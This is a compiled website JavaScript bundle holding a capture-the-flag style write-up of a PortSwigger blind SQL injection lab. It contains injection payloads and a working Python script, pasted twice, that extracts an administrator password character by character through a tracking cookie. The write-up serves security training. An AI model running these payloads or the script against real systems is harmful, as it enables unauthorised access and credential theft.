"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[1484],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return m}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var c=r.createContext({}),l=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=l(e.components);return r.createElement(c.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=l(n),m=a,f=d["".concat(c,".").concat(m)]||d[m]||u[m]||i;return n?r.createElement(f,o(o({ref:t},p),{},{components:n})):r.createElement(f,o({ref:t},p))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=d;var s={};for(var c in t)hasOwnProperty.call(t,c)&&(s[c]=t[c]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var l=2;l<i;l++)o[l]=n[l];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},274:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return p},default:function(){return d}});var r=n(7462),a=n(3366),i=(n(7294),n(3905)),o=["components"],s={},c="Lab: Blind SQL injection with conditional responses",l={unversionedId:"PortSwigger/SQL Injection/Lab 11",id:"PortSwigger/SQL Injection/Lab 11",isDocsHomePage:!1,title:"Lab: Blind SQL injection with conditional responses",description:"Task",source:"@site/docs/PortSwigger/SQL Injection/Lab 11.md",sourceDirName:"PortSwigger/SQL Injection",slug:"/PortSwigger/SQL Injection/Lab 11",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 11",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 11.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: SQL injection attack, listing the database contents on Oracle",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 10"},next:{title:"Lab: Blind SQL injection with conditional errors",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 12"}},p=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[]}],u={toc:p};function d(e){var t=e.components,n=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"lab-blind-sql-injection-with-conditional-responses"},"Lab: Blind SQL injection with conditional responses"),(0,i.kt)("h2",{id:"task"},"Task"),(0,i.kt)("p",null,"This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie."),(0,i.kt)("p",null,'The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.'),(0,i.kt)("p",null,"The database contains a different table called ",(0,i.kt)("inlineCode",{parentName:"p"},"users"),", with columns called ",(0,i.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"password"),". You need to exploit the blind SQL injection vulnerability to find out the password of the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,i.kt)("p",null,"To solve the lab, log in as the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,i.kt)("h2",{id:"solution"},"Solution"),(0,i.kt)("p",null,"As this application uses the ",(0,i.kt)("inlineCode",{parentName:"p"},"TrackingId")," cookie to track users and that cookie relates to the SQL database. Therefore, we can exploit this to retrieve the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator")," user's password.",(0,i.kt)("br",{parentName:"p"}),"\n","First, we need to make sure that it is indeed vulnerable by injecting:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"' AND 1=1--\n")),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130160864-87927571-3ac9-4322-aed2-a78b50fdf6e2.png",alt:"image"}),"  "),(0,i.kt)("p",null,"As the result, it is vulnerable because the response contains the ",(0,i.kt)("inlineCode",{parentName:"p"},"Welcome back!")," string.  "),(0,i.kt)("p",null,"Next, we find the length of the password:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20--\n")),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130160917-2559f3dd-6a7a-43ba-b82c-ce2b017c034f.png",alt:"image"}),"  "),(0,i.kt)("p",null,"Now, we know that the password is 20-character long.  "),(0,i.kt)("p",null,"Then, we start to discover each letter of password:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a'--\n'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='b'--\n...\n'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='a'--\n'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='b'--\n...\n")),(0,i.kt)("p",null,"Script:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nimport re\nimport string\nfrom concurrent import futures\nfrom concurrent.futures import ThreadPoolExecutor\n\nURL = 'https://ac161faf1f29b01d80c9fcdb00be0028.web-security-academy.net/filter?category=Pets'\nalphas = list(string.ascii_lowercase)\nalphas.extend(list(string.ascii_uppercase))\nalphas.extend(list(string.digits))\n\ndef brute(i):\n    for j in alphas:\n        COOKIES =  {'TrackingId':f\"B3cN9MgnWyqEImur'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}'--\",\n        'session':'0WJRV2KyH9TczDNShSpbiuxIimbJjtkv'}\n        resp = requests.get(URL, cookies=COOKIES)\n        if re.search('Welcome back!', resp.text):\n            return (i, j)\n\nres = []\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    tasks = []\n    for i in range(1, 21):\n        tasks.append(executor.submit(brute, i))\n    for f in futures.as_completed(tasks):\n        res.append(f.result())\n\nres = sorted(res, key=lambda x: x[0])\nprint(''.join([x[1] for x in res]))\nimport requests\nimport re\nimport string\nfrom concurrent import futures\nfrom concurrent.futures import ThreadPoolExecutor\n\nURL = 'https://ac161faf1f29b01d80c9fcdb00be0028.web-security-academy.net/filter?category=Pets'\nalphas = list(string.ascii_lowercase)\nalphas.extend(list(string.ascii_uppercase))\nalphas.extend(list(string.digits))\n\ndef brute(i):\n    for j in alphas:\n        COOKIES =  {'TrackingId':f\"B3cN9MgnWyqEImur'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}'--\",\n        'session':'0WJRV2KyH9TczDNShSpbiuxIimbJjtkv'}\n        resp = requests.get(URL, cookies=COOKIES)\n        if re.search('Welcome back!', resp.text):\n            return (i, j)\n\nres = []\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    tasks = []\n    for i in range(1, 21):\n        tasks.append(executor.submit(brute, i))\n    for f in futures.as_completed(tasks):\n        res.append(f.result())\n\nres = sorted(res, key=lambda x: x[0])\nprint(''.join([x[1] for x in res]))\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"(env) PS E:\\CTF> py .\\intruder.py\npfp9jezkril5vmp86w69\n")),(0,i.kt)("p",null,"Login:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130164204-0a1a2478-35e9-42f1-836f-6717d8ee1199.png",alt:"image"}),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Solved!")))}d.isMDXComponent=!0}}]);